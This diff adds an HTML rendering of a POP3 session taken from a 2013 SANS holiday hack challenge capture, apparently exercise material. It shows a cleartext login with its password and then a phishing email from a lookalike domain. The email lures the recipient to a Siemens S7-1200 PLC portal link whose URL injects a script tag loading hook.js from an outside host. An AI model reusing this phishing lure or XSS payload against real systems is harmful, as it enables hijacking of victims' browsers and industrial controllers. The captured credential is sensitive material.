@@ -1,0 +1,58 @@
+<HTML>
+<HEAD><TITLE>289</TITLE></HEAD><BODY bgcolor="white">
+<H1>pop3: 10.25.22.253:1804 -&gt; 10.16.11.5:110</H1>
+<H2>File ../sansholidayhack2013.pcap, Session 289</H2>
+<PRE WRAP="virtual">
+<font color="blue">+OK pop3 server ready
+</font><font color="red">USER dsawyer
+</font><font color="blue">+OK user accepted
+</font><font color="red">PASS Fashionista
+</font><font color="blue">+OK pass accepted
+</font><font color="red">STAT
+</font><font color="blue">+OK 1 1149
+</font><font color="red">LIST
+</font><font color="blue">+OK 1 messages (1149 octets)
+1 1149
+.
+</font><font color="red">RETR 1
+</font><font color="blue">+OK 1149 octets
+From george.bailey@valleyelectr1c.co.nw Fri Dec 06 10:53:05 2013 -0500
+Delivered-To: don.sawyer@valleyelectric.co.nw
+Return-Path: &lt;george.bailey@valleyelectr1c.co.nw&gt;
+From: George Bailey &lt;george.bailey@valleyelectr1c.co.nw&gt;
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: quoted-printable
+Subject: Configuration Change Reqeust
+Message-Id: &lt;FED9C3A9-0C63-4EC7-BE00-5AD2665B0857@hasborg.com&gt;
+Date: Fri, 6 Dec 2013 10:53:05 -0500
+To: Don Sawyer &lt;don.sawyer@valleyelectric.co.nw&gt;
+Mime-Version: 1.0 (Mac OS X Mail 7.0 \(1822\))
+X-Mailer: Apple Mail (2.1822)
+
+Don,
+
+I'm running around trying to take care of a bunch of tasks today.  Can =
+you monitor the Simatic S7-1200 PLC while I am out today?  Just click =
+the link below and keep the window open; if the controller shows "red", =
+then let me know.
+
+=
+http://10.25.22.23/Portal/Portal.mwsl?PriNav=3DStart&Send=3D%27%3E%3Cscrip=
+t%20src=3D%22http://10.2.2.2:3000/hook.js%E2%80%9D%3E&elementId=3D31337&Si=
+maticModel=3DS7-1200&ControlInterface=3DEnabled&StationName=3DCPU1212C_ACD=
+CRly&OperatingMode=3DRun&ShowStatusColor=3DYES
+
+Thanks,
+
+~Goerge=
+
+
+
+.
+</font><font color="red">DELE 1
+</font><font color="blue">+OK message 1 deleted
+</font><font color="red">QUIT
+</font><font color="blue">+OK POP3 server signing off
+</font></PRE>
+</BODY>
+</HTML>
